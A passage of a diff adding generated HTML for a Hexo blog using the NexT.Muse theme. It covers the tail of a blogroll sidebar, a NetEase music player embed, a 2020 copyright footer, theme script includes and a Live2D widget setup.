+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://rinbn.com/" title="http://rinbn.com/" rel="noopener" target="_blank">Rinbn</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.imzj.top/" title="https://www.imzj.top/" rel="noopener" target="_blank">imzj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://q0o0p.top" title="http://q0o0p.top" rel="noopener" target="_blank">q0o0p</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=40915694&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">瑟瑟发抖咸鱼黄</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
